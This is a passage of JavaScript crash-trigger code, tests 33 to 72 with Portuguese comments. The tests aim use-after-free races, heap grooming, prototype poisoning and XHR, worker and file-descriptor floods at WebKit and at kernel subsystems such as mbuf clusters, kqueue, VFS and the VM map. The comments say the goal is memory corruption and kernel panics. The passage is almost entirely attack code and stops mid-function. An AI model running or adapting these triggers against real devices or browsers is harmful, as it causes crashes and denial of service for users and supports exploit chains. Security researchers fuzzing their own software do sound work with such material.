    log("33. Node Removal UAF...");
    var root = document.createElement('div');
    var parent = document.createElement('div');
    var child = document.createElement('div');
    document.body.appendChild(root);
    root.appendChild(parent);
    parent.appendChild(child);
    
    child.addEventListener('DOMNodeRemoved', function() {
        // No momento que 'child' é removido, removemos 'parent'
        // Isso pode corromper a árvore DOM se o WebKit estiver percorrendo siblings
        if(root.contains(parent)) {
            root.removeChild(parent);
            // Tenta corromper a memória
            var filler = document.createElement('div');
            filler.setAttribute('a', 'A'.repeat(1000));
            root.appendChild(filler);
        }
    });
    
    try {
        parent.removeChild(child); // Dispara o evento
    } catch(e) { log(e); }
}

// 34. Socket Mbuf Cluster Fragmentation (Kernel)
// Alvo: Heap de Rede (Mbuf Clusters).
// Lógica: Envia payloads de tamanho exato (2048 bytes - headers) via XHR.
// Visa esgotar ou fragmentar a zona de memória usada para buffers de socket.
function runTest34() {
    log("34. Mbuf Frag...");
    var chunkSize = 2048 - 64; // Tenta alinhar com MCLBYTES
    var payload = new Uint8Array(chunkSize).fill(0x41);
    var reqs = [];
    
    var i = setInterval(function() {
        // Dispara rajadas de 20 conexões
        for(var k=0; k<20; k++) {
            try {
                var xhr = new XMLHttpRequest();
                // Usa endpoints aleatórios para evitar cache de socket
                xhr.open("POST", "/flood_" + Math.random(), true);
                xhr.send(payload);
                reqs.push(xhr);
            } catch(e) {}
        }
        // Mantém pressão constante sem OOM no navegador
        if(reqs.length > 200) {
            reqs.splice(0, 100).forEach(x => x.abort());
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 5000);
}

// 35. VFS Path Lookup Race Condition (Kernel)
// Alvo: namecache / lookup routines.
// Lógica: Usa History API para criar um caminho virtual profundo e tenta
// carregar recursos relativos enquanto navega no histórico (popstate).
function runTest35() {
    log("35. VFS Lookup Race...");
    var depth = 1000;
    var path = "/";
    for(var i=0; i<depth; i++) path += "x/";
    
    history.pushState({}, "deep", path);
    
    var t = setInterval(function() {
        // Thread 1: Tenta resolver caminho
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "resource", true);
        xhr.send();
        
        // Thread 2 (Main): Muda o diretório base
        history.back();
        setTimeout(function() { history.forward(); }, 1);
    }, 5);
    
    setTimeout(function() { clearInterval(t); }, 4000);
}

// 36. IPC Port Circular Transfer Panic (Kernel)
// Alvo: Mensagens IPC em voo (In-flight messages).
// Lógica: Cria um anel de workers e transfere portas em círculo fechado.
// Fecha as portas enquanto estão em trânsito.
function runTest36() {
    log("36. IPC Circular Panic...");
    var w1 = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){e.data.postMessage("ping");}'],{type:'text/javascript'})));
    var w2 = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){e.data.postMessage("pong");}'],{type:'text/javascript'})));
    
    var i = setInterval(function() {
        var mc = new MessageChannel();
        // Transfere Porta 1 para W1
        w1.postMessage(mc.port1, [mc.port1]);
        // Transfere Porta 2 para W2
        w2.postMessage(mc.port2, [mc.port2]);
        
        // Termina workers abruptamente enquanto eles trocam mensagens
        // O Kernel tem que lidar com os descritores de arquivo órfãos
        if(Math.random() > 0.8) {
            w1.terminate();
            w2.terminate();
            // Reinicia
            w1 = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){e.data.postMessage("ping");}'],{type:'text/javascript'})));
            w2 = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){e.data.postMessage("pong");}'],{type:'text/javascript'})));
        }
    }, 20);
    
    setTimeout(function() { clearInterval(i); }, 5000);
}
function runTest37() {
    log("37. Layout UAF...");
    var container = document.createElement('div');
    document.body.appendChild(container);
    var t = document.createElement('textarea');
    container.appendChild(t);
    t.focus();
    var val = "A".repeat(1024);
    t.value = val;
    t.setSelectionRange(10, 10);
    var observer = new MutationObserver(function() {
        if(document.body.contains(container)) {
            document.body.removeChild(container);
            var arr = [];
            for(var k=0; k<500; k++) arr.push(new Uint8Array(4096));
        }
    });
    observer.observe(container, {childList: true, subtree: true});
    try {
        document.execCommand("insertText", false, "B".repeat(500));
        var r = t.getBoundingClientRect();
        var x = r.width + r.height;
    } catch(e) { log(e); }
}

function runTest38() {
    log("38. XHR Type Confusion...");
    var w = new Worker(URL.createObjectURL(new Blob([
        "onmessage=function(e){ var x=new XMLHttpRequest(); x.open('GET',e.data,false); x.responseType='blob'; try{x.send();}catch(z){} postMessage(x.response); }"
    ], {type:'text/javascript'})));
    var data = new Uint8Array(1024*1024);
    var blob = new Blob([data]);
    var url = URL.createObjectURL(blob);
    var i = setInterval(function() {
        w.postMessage(url);
        setTimeout(function() {
            w.terminate();
            URL.revokeObjectURL(url);
            w = new Worker(URL.createObjectURL(new Blob([
                "onmessage=function(e){ var x=new XMLHttpRequest(); x.open('GET',e.data,false); x.responseType='text'; try{x.send();}catch(z){} }"
            ], {type:'text/javascript'})));
        }, 5);
    }, 50);
    setTimeout(function(){ clearInterval(i); }, 4000);
}

function runTest39() {
    log("39. TreeWalker Smash...");
    var root = document.createElement('div');
    var d1 = document.createElement('div');
    var d2 = document.createElement('div');
    root.appendChild(d1);
    d1.appendChild(d2);
    document.body.appendChild(root);
    var walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, {
        acceptNode: function(node) {
            if(node === d2) {
                root.removeChild(d1);
                var junk = [];
                for(var i=0; i<2000; i++) junk.push(new Float64Array(100));
                return NodeFilter.FILTER_ACCEPT;
            }
            return NodeFilter.FILTER_SKIP;
        }
    }, false);
    try {
        while(walker.nextNode()) {
            var c = walker.currentNode;
            c.setAttribute("data-test", "crash");
        }
    } catch(e) { log(e); }
}

function runTest40() {
    log("40. Socket Frag...");
    var pool = [];
    var payload = new Uint8Array(2048 - 32).fill(0xCC);
    var i = setInterval(function() {
        for(var k=0; k<15; k++) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/dummy_" + Math.random(), true);
            try {
                xhr.send(payload);
                pool.push(xhr);
            } catch(e) {}
        }
        if(pool.length > 200) {
            var victim = pool.splice(Math.floor(Math.random() * pool.length), 20);
            victim.forEach(function(x) { x.abort(); });
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 5000);
}

function runTest41() {
    log("41. Kqueue Race...");
    var blob = new Blob(["test"]);
    var readers = [];
    var active = true;
    function cycle() {
        if(!active) return;
        var fr = new FileReader();
        fr.readAsArrayBuffer(blob);
        readers.push(fr);
        if(readers.length > 100) {
            readers.shift(); 
        }
        if(Math.random() > 0.95) {
            var junk = new Blob(["junk".repeat(100)]);
            blob = junk;
        }
        setTimeout(cycle, 0);
    }
    for(var i=0; i<10; i++) cycle();
    setTimeout(function(){ active = false; }, 4000);
}

function runTest42() {
    log("42. Worker Flood...");
    var code = "self.onmessage=function(e){var a=new Uint8Array(1024*1024); self.postMessage(a,[a.buffer]);}";
    var blob = new Blob([code], {type:'text/javascript'});
    var url = URL.createObjectURL(blob);
    var workers = [];
    var i = setInterval(function() {
        try {
            var w = new Worker(url);
            w.onmessage = function(e) { e.data; };
            w.postMessage("init");
            workers.push(w);
            if(workers.length > 40) {
                var old = workers.shift();
                old.terminate();
            }
        } catch(e) {
            log("Thread Limit Hit");
            workers.forEach(function(w){ w.terminate(); });
            workers = [];
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 5000);
}
function runTest43() {
    log("43. SplitText Desync...");
    var div = document.createElement('div');
    document.body.appendChild(div);
    var t1 = document.createTextNode("A".repeat(1000));
    div.appendChild(t1);
    var observer = new MutationObserver(function() {
        try {
            div.normalize(); 
            var range = document.createRange();
            range.selectNodeContents(div);
            range.detach();
            div.textContent = ""; 
            var f = document.createElement('div');
            f.appendChild(t1); 
        } catch(e) {}
    });
    observer.observe(div, {childList: true, characterData: true, subtree: true});
    try {
        var t2 = t1.splitText(500); 
        div.insertBefore(document.createElement('span'), t2);
    } catch(e) { log(e); }
}

function runTest44() {
    log("44. JSON Smash...");
    var obj = { a: 1 };
    var arr = [];
    for(var i=0; i<5000; i++) {
        var o = { next: obj };
        arr.push(o);
        obj = o;
    }
    obj.toJSON = function() {
        this.next = this; 
        arr.length = 0; 
        var filler = new Uint8Array(1024*1024);
        return "crash";
    };
    try {
        JSON.stringify(obj);
    } catch(e) { 
        log("JSON Error: " + e);
        try { JSON.stringify(arr); } catch(z) {}
    }
}

function runTest45() {
    log("45. Form UAF...");
    var f = document.createElement('form');
    document.body.appendChild(f);
    var i1 = document.createElement('input');
    i1.name = "target";
    f.appendChild(i1);
    var i2 = document.createElement('input');
    i2.name = "target";
    f.appendChild(i2);
    
    var val = f.elements['target']; 
    
    f.addEventListener('DOMNodeRemoved', function() {
        if(f.elements['target']) {
            var leak = f.elements['target'].length; 
            f.textContent = ''; 
            var j = []; 
            for(var k=0; k<100; k++) j.push(new Float64Array(100));
        }
    });
    f.removeChild(i1); 
}

function runTest46() {
    log("46. VM Frag...");
    var chunks = [];
    var i = setInterval(function() {
        var size = Math.floor(Math.random() * 1024 * 1024) + 4096;
        var b = new Blob([new Uint8Array(size)]);
        chunks.push(b);
        if(chunks.length > 50) {
            var v = chunks.shift(); 
            var u = URL.createObjectURL(v);
            var x = new XMLHttpRequest();
            x.open('GET', u, true);
            x.send();
            setTimeout(function(){ URL.revokeObjectURL(u); }, 2);
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); chunks = []; }, 4000);
}

function runTest47() {
    log("47. FD Starvation...");
    var reqs = [];
    var i = setInterval(function() {
        for(var k=0; k<10; k++) {
            var x = new XMLHttpRequest();
            x.open("GET", "/" + Math.random(), true);
            x.send();
            reqs.push(x);
        }
        if(reqs.length > 300) {
            var batch = reqs.splice(0, 150);
            batch.forEach(function(r) { r.abort(); });
        }
    }, 20);
    setTimeout(function(){ clearInterval(i); }, 5000);
}

function runTest48() {
    log("48. Signal Overflow...");
    var wCode = "self.onmessage=function(e){ while(1); }"; 
    var b = new Blob([wCode], {type:'text/javascript'});
    var u = URL.createObjectURL(b);
    var workers = [];
    var i = setInterval(function() {
        var w = new Worker(u);
        w.postMessage("run");
        workers.push(w);
        if(workers.length > 20) {
            var old = workers.shift();
            // Terminate envia sinal SIGKILL/SIGTERM ao processo
            // Fazer isso em loop rápido estressa a fila de sinais do kernel
            old.terminate(); 
        }
    }, 50);
    setTimeout(function(){ clearInterval(i); workers.forEach(w=>w.terminate()); }, 4000);
}
function runTest49() {
    log("49. CSSRule UAF...");
    var s = document.createElement('style');
    document.head.appendChild(s);
    var sheet = s.sheet;
    var i = setInterval(function() {
        try {
            sheet.insertRule("#a { color: red; }", 0);
            sheet.insertRule("#b { width: 100px; }", 1);
            var rule = sheet.cssRules[0];
            var proxy = new Proxy(rule, {
                get: function(t, p) {
                    if(p === 'selectorText') {
                        sheet.deleteRule(0);
                        var f = [];
                        for(var k=0; k<100; k++) f.push(new Uint8Array(1024));
                    }
                    return Reflect.get(t, p);
                }
            });
            var txt = proxy.selectorText;
            sheet.deleteRule(0);
        } catch(e) {}
    }, 5);
    setTimeout(function(){ clearInterval(i); document.head.removeChild(s); }, 4000);
}

function runTest50() {
    log("50. AdoptNode Race...");
    var doc1 = document.implementation.createHTMLDocument("doc1");
    var doc2 = document.implementation.createHTMLDocument("doc2");
    var div = doc1.createElement("div");
    doc1.body.appendChild(div);
    div.addEventListener("DOMNodeRemoved", function() {
        doc2 = null; 
        var arr = [];
        for(var i=0; i<5000; i++) arr.push(new Float64Array(100)); 
    });
    try {
        var iter = 0;
        var t = setInterval(function() {
            if(!doc1 || !div) return;
            var adopted = doc2.adoptNode(div); 
            doc1.body.appendChild(adopted); 
            iter++;
            if(iter > 100) { clearInterval(t); }
        }, 10);
    } catch(e) { log(e); }
}

function runTest51() {
    log("51. EventPath UAF...");
    var g = document.createElement('div');
    var p = document.createElement('div');
    var c = document.createElement('div');
    g.appendChild(p);
    p.appendChild(c);
    document.body.appendChild(g);
    var lock = false;
    c.addEventListener('click', function(e) {
        if(lock) return;
        lock = true;
        g.removeChild(p); 
        p.textContent = ""; 
        var junk = new Array(1000).fill("A".repeat(1000));
    }, {capture: true}); 
    try {
        var ev = new MouseEvent('click', {bubbles: true, cancelable: true});
        c.dispatchEvent(ev);
    } catch(e) { log(e); }
}

function runTest52() {
    log("52. FileReader Panic...");
    var b = new Blob([new Uint8Array(1024*1024*2)]);
    var u = URL.createObjectURL(b);
    var workers = [];
    var i = setInterval(function() {
        var w = new Worker(URL.createObjectURL(new Blob([
            "onmessage=function(e){ var fr=new FileReader(); fr.readAsArrayBuffer(e.data); var x=new XMLHttpRequest(); x.open('GET', 'blob:'+Math.random(), false); try{x.send();}catch(z){} }"
        ], {type:'text/javascript'})));
        w.postMessage(b); 
        workers.push(w);
        if(workers.length > 20) {
            var old = workers.shift();
            old.terminate();
        }
    }, 50);
    setTimeout(function(){ clearInterval(i); URL.revokeObjectURL(u); }, 4000);
}

function runTest53() {
    log("53. Zombie Flood...");
    var mc = new MessageChannel();
    var p1 = mc.port1;
    var p2 = mc.port2;
    var w = new Worker(URL.createObjectURL(new Blob([
        "onmessage=function(e){ var p=e.data; while(true){ p.postMessage('flood'); } }"
    ], {type:'text/javascript'})));
    w.postMessage(p2, [p2]);
    setTimeout(function() {
        w.terminate(); 
        var payload = new Uint8Array(1024);
        for(var i=0; i<5000; i++) {
            p1.postMessage(payload); 
        }
    }, 100);
}

function runTest54() {
    log("54. Stack Guard...");
    function recursive(depth) {
        if(depth <= 0) {
            try {
                var x = new XMLHttpRequest();
                x.open("GET", "/", false);
                x.send();
            } catch(e) {}
            return;
        }
        var arr = new Uint8Array(256); 
        recursive(depth - 1);
    }
    var i = setInterval(function() {
        var w = new Worker(URL.createObjectURL(new Blob([
            "onmessage=function(e){ " + recursive.toString() + "; recursive(1500); }"
        ], {type:'text/javascript'})));
        w.postMessage("start");
        setTimeout(function(){ w.terminate(); }, 100); 
    }, 200);
    setTimeout(function(){ clearInterval(i); }, 5000);
}
// 55. AudioBufferSourceNode Detach Race (WebKit)
// Alvo: Thread de Áudio do WebKit.
// Lógica: Inicia a reprodução de um AudioBuffer e tenta transferir (neutering) 
// o ArrayBuffer subjacente para um Worker enquanto o motor de áudio ainda está lendo os dados PCM.
function runTest55() {
    log("55. Audio Race...");
    try {
        var ctx = new (window.AudioContext || window.webkitAudioContext)();
        var sampleRate = 44100;
        var frameCount = sampleRate * 2;
        var buffer = ctx.createBuffer(2, frameCount, sampleRate);
        var data = new Float32Array(frameCount);
        data.fill(0.5);
        buffer.copyToChannel(data, 0);
        
        var src = ctx.createBufferSource();
        src.buffer = buffer;
        src.connect(ctx.destination);
        src.start();
        
        // Race: Transferir os dados brutos enquanto toca
        var w = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){e.data;}'],{type:'text/javascript'})));
        
        // Tenta acessar o canal de dados diretamente e transferi-lo
        // Nota: WebAudio protege buffers internos, mas implementações antigas/customizadas podem falhar
        var channelData = buffer.getChannelData(0).buffer;
        
        setTimeout(function() {
            try {
                w.postMessage(channelData, [channelData]);
                src.stop();
            } catch(e) {}
        }, 10);
    } catch(e) { log(e); }
}

// 56. HTMLFormControls NamedItem UAF (WebKit)
// Alvo: Cache de coleções HTML.
// Lógica: Acessa elementos de formulário via nome, remove-os do DOM dentro de um getter,
// e tenta acessar a propriedade 'value' ou 'type' do nó removido através da coleção em cache.
function runTest56() {
    log("56. Form NamedItem UAF...");
    var f = document.createElement('form');
    document.body.appendChild(f);
    var i = document.createElement('input');
    i.name = "victim";
    f.appendChild(i);
    
    var val = f['victim']; // Cache references
    
    Object.defineProperty(i, 'type', {
        get: function() {
            f.removeChild(i);
            var junk = [];
            for(var k=0; k<1000; k++) junk.push(new Uint8Array(1024));
            return "text";
        }
    });
    
    // Trigger
    try {
        var ref = f['victim'];
        var t = ref.type; // Dispara getter que remove o elemento
        // A coleção pode tentar revalidar o item que acabou de ser deletado
    } catch(e) { log(e); }
}

// 57. Array Splice Proxy Resize Panic (WebKit)
// Alvo: Método Splice do Array (C++).
// Lógica: Usa um Proxy para interceptar a leitura de índices durante o 'splice'.
// Redimensiona o array para 0 no meio da operação de cópia/movimento de memória.
function runTest57() {
    log("57. Splice Proxy Panic...");
    var arr = [];
    for(var i=0; i<1000; i++) arr[i] = {};
    
    var proxy = new Proxy(arr, {
        get: function(target, prop) {
            if(prop === '500') {
                target.length = 0; // Nuke
                var f = new Float64Array(10000); // Fill memory
                return undefined;
            }
            return Reflect.get(target, prop);
        },
        has: function(target, prop) { return Reflect.has(target, prop); }
    });
    
    try {
        // Splice precisa ler, mover e deletar.
        // Se o tamanho mudar durante o loop interno do C++, ocorre corrupção de heap.
        Array.prototype.splice.call(proxy, 0, 800);
    } catch(e) { log(e); }
}

// 58. File Descriptor Table Race via XHR (Kernel)
// Alvo: Tabela de descritores de arquivo (fdesc).
// Lógica: Abre milhares de XHRs síncronos e assíncronos em Workers, aborta-os e reinicia.
// Tenta causar uma colisão no alocador de FDs ou UAF na estrutura 'file' do kernel.
function runTest58() {
    log("58. FD Table Race...");
    var workers = [];
    var blob = new Blob(["test"]);
    var url = URL.createObjectURL(blob);
    
    var i = setInterval(function() {
        var w = new Worker(URL.createObjectURL(new Blob([
            "onmessage=function(e){ var x=new XMLHttpRequest(); x.open('GET',e.data,false); try{x.send();}catch(z){} }"
        ], {type:'text/javascript'})));
        
        w.postMessage(url);
        workers.push(w);
        
        if(workers.length > 50) {
            var dead = workers.shift();
            dead.terminate(); // Fecha FDs abruptamente
            // Tenta abrir mais FDs imediatamente na main thread para reutilizar o slot
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "/", true);
            try { xhr.send(); } catch(e){}
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 4000);
}

// 59. VM Object Shadow Chain Collapse (Kernel)
// Alvo: Gerenciador de Memória Virtual (VM Map).
// Lógica: Cria Blobs baseados em slices de outros Blobs recursivamente.
// Isso cria uma cadeia de "Shadow Objects" no kernel. Revogar a raiz pode causar colapso recursivo.
function runTest59() {
    log("59. VM Shadow Chain...");
    var root = new Blob([new Uint8Array(1024*1024)]);
    var current = root;
    var depth = 0;
    
    try {
        // Cria profundidade de shadow objects
        for(var i=0; i<500; i++) {
            var slice = current.slice(0, 1024*1024);
            current = new Blob([slice, "padding"]); // Combina slice + novo dados para forçar novo mapa
            depth++;
        }
        
        var u = URL.createObjectURL(current);
        var xhr = new XMLHttpRequest();
        xhr.open("GET", u, true);
        xhr.send();
        
        // Destrói a raiz da cadeia enquanto o kernel resolve as páginas da folha
        setTimeout(function() {
            root = null; // GC pressure
            current = null;
            URL.revokeObjectURL(u);
        }, 10);
    } catch(e) { log(e); }
}

// 60. IPV6 Header Mbuf Overflow (Kernel)
// Alvo: Pilha de Rede (Mbuf allocation).
// Lógica: Envia payloads que simulam cabeçalhos complexos ou fragmentação excessiva via XHR.
// O tamanho 2048 (MCLBYTES) é crítico. Enviamos (2048 + pequeno delta) para forçar alocação de cluster + mbuf normal.
function runTest60() {
    log("60. Mbuf Overflow...");
    // Tamanho específico para estressar o alocador de zonas
    var size = 2048 + 128; 
    var payload = new Uint8Array(size).fill(0x41);
    var pool = [];
    
    var i = setInterval(function() {
        for(var k=0; k<10; k++) {
            var xhr = new XMLHttpRequest();
            // Tenta usar caminhos diferentes para evitar cache
            xhr.open("POST", "/mbuf_spray_" + Math.random(), true);
            try {
                xhr.send(payload);
                pool.push(xhr);
            } catch(e) {}
        }
        
        // Limpa conexões antigas para liberar mbufs para a free list,
        // tentando criar fragmentação (holes) no heap
        if(pool.length > 100) {
            var old = pool.splice(0, 50);
            old.forEach(function(x){ x.abort(); });
        }
    }, 5);
    setTimeout(function(){ clearInterval(i); }, 5000);
}
// 61. TrackEvent Dispatch UAF (WebKit)
// Alvo: HTMLMediaElement TextTracks.
// Lógica: Dispara eventos em faixas de texto de vídeo enquanto modifica a lista de faixas.
// Tenta acessar uma faixa que foi removida da memória durante o loop de eventos.
function runTest61() {
    log("61. Track UAF...");
    var v = document.createElement('video');
    var t1 = v.addTextTrack("subtitles", "A");
    var t2 = v.addTextTrack("subtitles", "B");
    t1.mode = "showing";
    
    // Handler recursivo que destroi o objeto pai
    t1.oncuechange = function() {
        v.innerHTML = ""; // Limpa tracks
        var junk = [];
        for(var i=0; i<500; i++) junk.push(new Uint8Array(2048));
        try {
            // Tenta acessar propriedades de t2 que pode ter sido libertado
            var m = t2.mode; 
            t2.mode = "hidden";
        } catch(e) {}
    };
    
    // Força disparo do evento
    var cue = new VTTCue(0, 1, "test");
    t1.addCue(cue);
    try {
        cue.dispatchEvent(new Event('enter'));
        cue.dispatchEvent(new Event('exit'));
    } catch(e) { log(e); }
}

// 62. Range ExtractContents Mutation Race (WebKit)
// Alvo: DOM Core Ranges.
// Lógica: Usa extractContents em uma árvore complexa onde nós são removidos
// via MutationObserver durante o processo de extração.
function runTest62() {
    log("62. Range Race...");
    var div = document.createElement('div');
    var s1 = document.createElement('span');
    var s2 = document.createElement('span');
    div.appendChild(s1);
    s1.appendChild(s2);
    document.body.appendChild(div);
    
    var range = document.createRange();
    range.selectNodeContents(div);
    
    var obs = new MutationObserver(function() {
        // Muta a árvore enquanto o C++ calcula a extração
        if(div.contains(s1)) {
            div.removeChild(s1);
            var arr = new Array(1000).fill(1.1);
        }
    });
    obs.observe(div, {childList:true, subtree:true});
    
    try {
        // Aciona o observer ao modificar um atributo antes da extração finalizar
        s1.setAttribute("data-trigger", "1");
        var frag = range.extractContents();
        document.body.appendChild(frag);
    } catch(e) { log(e); }
}

// 63. DOMStringMap Prototype Poisoning (WebKit)
// Alvo: Dataset attributes (data-*).
// Lógica: Envenena o protótipo de String para interceptar acessos ao dataset,
// modificando o elemento dono do dataset durante a leitura.
function runTest63() {
    log("63. Dataset Poison...");
    var d = document.createElement('div');
    d.setAttribute('data-target', 'payload');
    document.body.appendChild(d);
    
    var map = d.dataset;
    
    // Define propriedade no Object.prototype para capturar o acesso interno
    var prop = 'target';
    Object.defineProperty(Object.prototype, prop, {
        get: function() {
            if(this === map) {
                document.body.removeChild(d);
                var f = new Float32Array(1024*1024);
                return "poison";
            }
        },
        configurable: true
    });
    
    try {
        var val = d.dataset.target; 
        delete Object.prototype[prop];
    } catch(e) { log(e); }
}

// 64. Socket Sendfile Zero-Copy Panic (Kernel)
// Alvo: Stack de Rede (sendfile/sosend).
// Lógica: Simula envio de arquivos grandes via upload XHR combinados com slicing
// de Blobs para tentar ativar caminhos de "zero-copy" e abortar abruptamente.
function runTest64() {
    log("64. Zero-Copy Panic...");
    var data = new Uint8Array(1024*1024*5); // 5MB
    var blob = new Blob([data]);
    var reqs = [];
    
    var i = setInterval(function() {
        var slice = blob.slice(0, 1024*1024);
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "/dummy_upload", true);
        
        // Tenta forçar o kernel a mapear páginas do blob para o socket
        xhr.send(slice);
        reqs.push(xhr);
        
        // Aborta imediatamente para estressar a limpeza de mbufs
        if(reqs.length > 50) {
            var batch = reqs.splice(0, 40);
            batch.forEach(function(x){ x.abort(); });
        }
    }, 10);
    setTimeout(function(){ clearInterval(i); }, 4000);
}

// 65. Kqueue File Monitor Exhaustion (Kernel)
// Alvo: Subsistema kevent/kqueue.
// Lógica: Cria milhares de FileReaders monitorando o mesmo Blob.
// Tenta esgotar os "knote" (kernel notes) associados ao descritor de arquivo.
function runTest65() {
    log("65. Kqueue Flood...");
    var b = new Blob(["A".repeat(1024)]);
    var readers = [];
    
    var i = setInterval(function() {
        for(var k=0; k<100; k++) {
            var fr = new FileReader();
            // Inicia leitura mas não deixa terminar (mantém evento pendente)
            fr.readAsText(b);
            readers.push(fr);
        }
        
        // Libera em lotes para causar picos de alocação/desalocação
        if(readers.length > 5000) {
            readers = []; // GC tratará do fechamento, causando lag no kernel
            log("Flushing knotes...");
        }
    }, 50);
    setTimeout(function(){ clearInterval(i); }, 5000);
}

// 66. VM Object Collapse via Recursive Blob (Kernel)
// Alvo: VM Map e Paging.
// Lógica: Cria uma cadeia de Blobs onde cada novo Blob é composto por arrays
// de Blobs anteriores, criando uma árvore de referência profunda no Kernel VM.
function runTest66() {
    log("66. VM Collapse...");
    var root = new Blob([new Uint8Array(4096)]);
    var stack = [root];
    
    try {
        // Cria complexidade exponencial
        for(var i=0; i<18; i++) {
            var parts = [];
            // Cada nível multiplica referências ao nível anterior
            for(var k=0; k<4; k++) parts.push(stack[i]);
            var next = new Blob(parts);
            stack.push(next);
        }
        
        var u = URL.createObjectURL(stack[stack.length-1]);
        
        // Dispara leitura da árvore complexa
        var xhr = new XMLHttpRequest();
        xhr.open("GET", u, true);
        xhr.send();
        
        // Revoga enquanto o kernel percorre a árvore de mapeamento
        setTimeout(function(){ URL.revokeObjectURL(u); stack=null; }, 10);
    } catch(e) { log(e); }
}
// 67. Fullscreen Promise Element Detach UAF (WebKit)
// Alvo: Promise do requestFullscreen.
// Lógica: O WebKit retorna uma Promise ao solicitar fullscreen. Se removermos o elemento
// do DOM imediatamente após a solicitação, mas antes da Promise resolver/rejeitar,
// o callback interno pode tentar acessar o layout de um objeto destruído.
function runTest67() {
    log("67. FS Promise UAF...");
    var div = document.createElement('div');
    document.body.appendChild(div);
    var p = document.createElement('p');
    div.appendChild(p);
    
    try {
        var prom = p.requestFullscreen();
        
        document.body.removeChild(div);
        div = null;
        p = null;
        
        var junk = [];
        for(var i=0; i<5000; i++) junk.push(new Uint8Array(4096));
        
        prom.then(function() {
            log("Promise resolved (Unexpected)");
        }).catch(function(e) {
            log("Promise rejected: " + e);
        });
    } catch(e) { log(e); }
}

// 68. SVG Animation Fullscreen Render Crash (WebKit)
// Alvo: Renderizador SVG (SMIL).
// Lógica: Anima um SVG complexo enquanto alterna o modo fullscreen.
// A transição de tela força um re-layout global; modificar a árvore SVG
// durante este cálculo crítico pode causar corrupção de memória no renderizador.
function runTest68() {
    log("68. SVG FS Crash...");
    var ns = "http://www.w3.org/2000/svg";
    var svg = document.createElementNS(ns, "svg");
    var rect = document.createElementNS(ns, "rect");
    var anim = document.createElementNS(ns, "animate");
    
    rect.setAttribute("width", "100");
    rect.setAttribute("height", "100");
    anim.setAttribute("attributeName", "x");
    anim.setAttribute("from", "0");
    anim.setAttribute("to", "500");
    anim.setAttribute("dur", "5s");
    anim.setAttribute("repeatCount", "indefinite");
    
    rect.appendChild(anim);
    svg.appendChild(rect);
    document.body.appendChild(svg);
    
    try {
        svg.requestFullscreen();
        var i = setInterval(function() {
            if(document.fullscreenElement) {
                rect.setAttribute("width", Math.random() * 1000);
                document.exitFullscreen();
                svg.removeChild(rect);
                svg.appendChild(rect);
            }
        }, 10);
        setTimeout(function(){ clearInterval(i); }, 3000);
    } catch(e) { log(e); }
}

// 69. ShadowDOM Slot Fullscreen Event Race (WebKit)
// Alvo: Propagação de Eventos em ShadowDOM.
// Lógica: Dispara eventos através de Slots projetados enquanto destrói o ShadowHost
// durante uma mudança de estado de fullscreen.
function runTest69() {
    log("69. Shadow FS Race...");
    var host = document.createElement('div');
    document.body.appendChild(host);
    var root = host.attachShadow({mode: 'open'});
    var slot = document.createElement('slot');
    root.appendChild(slot);
    
    var child = document.createElement('div');
    host.appendChild(child);
    
    child.addEventListener('fullscreenchange', function() {
        if(document.body.contains(host)) {
            document.body.removeChild(host);
            var arr = new Array(1000).fill(1);
        }
    });
    
    try {
        child.requestFullscreen().then(function() {
            document.exitFullscreen();
        }).catch(e=>{});
        
        setTimeout(function() {
            host.innerHTML = "";
        }, 0);
    } catch(e) { log(e); }
}

// 70. Compositor Surface Realloc Panic (Kernel)
// Alvo: Gerenciador de Janelas / GPU.
// Lógica: Alterna Fullscreen rapidamente enquanto redimensiona um Canvas pesado.
// O objetivo é fazer o kernel perder a sincronia entre o buffer de vídeo da janela
// e a superfície real da GPU durante a troca de contexto.
function runTest70() {
    log("70. Compositor Panic...");
    var c = document.createElement('canvas');
    c.width = 1920; c.height = 1080;
    var ctx = c.getContext('2d');
    document.body.appendChild(c);
    
    var i = setInterval(function() {
        if(!document.fullscreenElement) {
            try { c.requestFullscreen(); } catch(e){}
        } else {
            document.exitFullscreen();
        }
        
        c.width = (c.width === 100) ? 1920 : 100;
        ctx.fillStyle = "red";
        ctx.fillRect(0,0,c.width,c.height);
        
        var img = ctx.getImageData(0,0,10,10);
    }, 50);
    setTimeout(function(){ clearInterval(i); }, 5000);
}

// 71. VFS Blob Lock during Mode Switch (Kernel)
// Alvo: Bloqueio de Vnodes (File System).
// Lógica: A transição de Fullscreen pode causar pausas momentâneas em threads de UI.
// Exploramos isso disparando leituras de Blob massivas e revogando o URL durante a transição.
function runTest71() {
    log("71. VFS Mode Switch...");
    var blob = new Blob([new Uint8Array(1024*1024*4)]);
    var url = URL.createObjectURL(blob);
    var readers = [];
    
    document.documentElement.requestFullscreen().catch(e=>{});
    
    var i = setInterval(function() {
        for(var k=0; k<10; k++) {
            var fr = new FileReader();
            fr.readAsArrayBuffer(blob.slice(k*100, (k*100)+4096));
            readers.push(fr);
        }
        
        if(readers.length > 50) {
            URL.revokeObjectURL(url);
            url = URL.createObjectURL(blob);
            readers = [];
            if(document.fullscreenElement) document.exitFullscreen();
            else try{document.documentElement.requestFullscreen()}catch(e){}
        }
    }, 20);
    setTimeout(function(){ clearInterval(i); }, 4000);
}

// 72. Scheduler Affinity Thrash via Workers (Kernel)
// Alvo: Agendador de CPU (Scheduler).
// Lógica: Entrar em Fullscreen altera a prioridade do processo e afinidade de núcleos.
// Criar e destruir Workers agressivamente durante esta troca confunde o balanceador de carga.
function runTest72() {
    log("72. Scheduler Thrash...");
    var code = "while(true){}";
    var url = URL.createObjectURL(new Blob([code], {type:'text/javascript'}));
    var workers = [];
    
    try { document.body.requestFullscreen(); } catch(e){}
    
    var i = setInterval(function() {
        var w = new Worker(url);
        workers.push(w);
        
        if(workers.length > 16) {
